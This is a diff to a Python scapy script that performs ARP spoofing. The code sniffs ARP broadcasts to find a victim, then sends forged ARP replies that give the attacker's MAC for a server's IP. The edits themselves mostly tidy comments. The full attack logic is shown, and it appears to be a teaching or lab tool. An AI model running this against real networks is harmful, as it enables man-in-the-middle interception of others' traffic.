@@ -1,9 +1,9 @@
 import scapy.all as sc;
 import time;
-import ipaddress;
 
 interface = sc.conf.iface
 
+# Get mac adress of given IP adress
 def get_mac(ip):
     arp = sc.ARP(pdst=ip)
     broadcast = sc.Ether(dst="ff:ff:ff:ff:ff:ff")
@@ -13,7 +13,7 @@ def get_mac(ip):
         return received.hwsrc
     return None
 
-#do the poisoning
+# Do the poisoning
 def arp_poisoning(toSpoof, spoof_as_mac, mode, logger=None):
     def log(msg):
         if logger:
@@ -26,7 +26,7 @@ def arp_poisoning(toSpoof, spoof_as_mac, mode, logger=None):
     victim_ip = toSpoof
 
     try:
-        # wait for any arp broadcast
+        # Wait for any arp broadcast
         if not victim_ip:
             log("Waiting for any ARP broadcast to discover victim IPs")
             pkt = sc.sniff(
@@ -41,9 +41,8 @@ def arp_poisoning(toSpoof, spoof_as_mac, mode, logger=None):
             victim_ip = pkt[sc.ARP].psrc
             server_ip = pkt[sc.ARP].pdst
             victim_mac = get_mac(victim_ip)
-
-        #get mac addresses from given IP's
         else:
+            # Wait for any ARP broadcast done by the victim at victim_ip
             log("Waiting for ARP broadcast from victim")
             victim_mac = get_mac(victim_ip)
             pkt = sc.sniff(
@@ -62,11 +61,11 @@ def arp_poisoning(toSpoof, spoof_as_mac, mode, logger=None):
             log("Could not resolve MAC addresses.")
             return None, None
 
-        # create the fake responses
+        # Create the fake response
         fake_packet_victim = sc.Ether(dst=victim_mac) / sc.ARP(
             op=2, pdst=victim_ip, hwdst=victim_mac, psrc=server_ip, hwsrc=attacker_mac)
 
-        #send the responses
+        # Send the response
         if mode == "silent":
             sc.sendp(fake_packet_victim, iface=interface, verbose=False)
         else:
